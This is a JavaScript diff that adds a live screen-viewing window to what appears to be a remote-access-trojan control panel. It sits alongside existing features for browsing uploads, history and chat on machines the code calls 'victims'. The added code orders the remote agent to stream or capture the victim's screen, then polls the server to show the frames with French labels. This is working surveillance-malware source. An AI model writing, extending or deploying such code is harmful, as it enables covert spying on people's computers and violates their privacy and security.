@@ -456,6 +456,7 @@ function dispatch(victims, mod) {
   if (mod.verb === "_uploads") return openUploads(one);
   if (mod.verb === "_history") return openHistory(one);
   if (mod.verb === "_chat") return openChat(one);
+  if (mod.verb === "_live") return openLive(one);
 
   // The registry marks verbs that end the session or wipe state. A misfired
   // right-click on "Éteindre" should not power off a machine mid-job, and the
@@ -606,6 +607,73 @@ function openUploads(victim) {
   };
   win.poll = poll;
   poll();
+}
+
+// Live screen viewer. The console cannot push a stream, so the panel drives it:
+// one /api/live call reports the newest frame id and only a changed id pulls
+// bytes. A 1.2 s poll on top of a 2 fps agent cadence reads as motion without
+// re-downloading the same JPEG fifty times a minute.
+function openLive(victim) {
+  const key = victim.id + ":live";
+  const existing = state.windows.get(key);
+  if (existing) {
+    existing.el.classList.add("show");
+    return;
+  }
+
+  let timer = null;
+  const win = makeWindow(key, "Écran en direct", victim.host || victim.id, () => {
+    if (timer) clearInterval(timer);
+    timer = null;
+  });
+  win.body.innerHTML = `
+    <div class="row" style="gap:6px;align-items:center;margin-bottom:8px">
+      <button data-a="stream">flux 30 s</button>
+      <button data-a="once">capture</button>
+      <span class="live-state" style="margin-left:auto;opacity:.7"></span>
+    </div>
+    <div style="background:#0b0d10;border:1px solid #222;border-radius:6px;min-height:240px;display:flex;align-items:center;justify-content:center;overflow:hidden">
+      <img alt="" style="max-width:100%;max-height:60vh;display:block">
+    </div>`;
+  const img = win.body.querySelector("img");
+  const stateEl = win.body.querySelector(".live-state");
+  let shown = 0;
+
+  win.body.querySelector("[data-a=stream]").addEventListener("click", async () => {
+    await sendRaw(victim, "live", "30 2 50");
+    stateEl.textContent = "flux demandé…";
+  });
+  win.body.querySelector("[data-a=once]").addEventListener("click", async () => {
+    await sendRaw(victim, "screen", "");
+    stateEl.textContent = "capture demandée…";
+  });
+
+  const poll = async () => {
+    const open = state.windows.get(key);
+    if (!open || !open.el.classList.contains("show")) return;
+    let data;
+    try {
+      data = await api("/api/live?vid=" + encodeURIComponent(victim.id));
+    } catch (e) {
+      return;
+    }
+    if (!data.ok) return;
+    const frame = data.frame;
+    if (!frame) {
+      stateEl.textContent = "aucune frame reçue";
+      return;
+    }
+    if (Number(frame.id) !== shown) {
+      shown = Number(frame.id);
+      img.src = "/api/frame?id=" + frame.id + "&t=" + Date.now();
+    }
+    const age = Math.max(0, Math.round((Date.now() - new Date(frame.created).getTime()) / 1000));
+    stateEl.textContent =
+      "frame " + frame.id + " · " + (Number(frame.bytes) / 1024).toFixed(0) + " Ko · il y a " + age + " s";
+  };
+  win.poll = poll;
+  poll();
+  timer = setInterval(poll, 1200);
 }
 
 function openChat(victim) {
